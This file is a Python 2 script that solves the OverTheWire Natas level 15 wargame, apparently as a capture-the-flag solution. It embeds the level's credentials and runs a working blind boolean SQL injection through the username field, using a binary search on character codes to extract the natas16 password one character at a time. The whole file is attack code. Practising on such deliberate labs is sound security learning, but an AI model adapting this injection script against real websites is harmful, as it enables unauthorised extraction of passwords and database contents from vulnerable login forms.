import urllib, urllib2
passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
passman.add_password(None, "http://natas15.natas.labs.overthewire.org/index.php", 'natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
urllib2.install_opener(urllib2.build_opener(urllib2.HTTPBasicAuthHandler(passman)))

flag = ''
i = 0
while (True):
    found = False
    i += 1

    min_ord = 0x30 # '0'
    max_ord = 0x7A # 'z'
    while (True):
        if (min_ord == max_ord):
            last_compare = True
            current_ord = min_ord
        else:
            last_compare = False
            current_ord = (min_ord + max_ord) / 2

        if not last_compare:
            data = [('username', 'natas16" AND ascii(substring(password,{0},1)) > {1}#'.format(i, current_ord))]
        else:
            data = [('username', 'natas16" AND ascii(substring(password,{0},1)) = {1}#'.format(i, current_ord))]
        data = urllib.urlencode(data)

        req = urllib2.Request('http://natas15.natas.labs.overthewire.org/index.php', data)
        source = urllib2.urlopen(req).read()

        if ('exists' in source):
            if last_compare:
                found = True
                flag += chr(current_ord)
                print flag
            min_ord = current_ord + 1
        else:
            max_ord = current_ord

        if last_compare:
            break

    if (not found):
        break
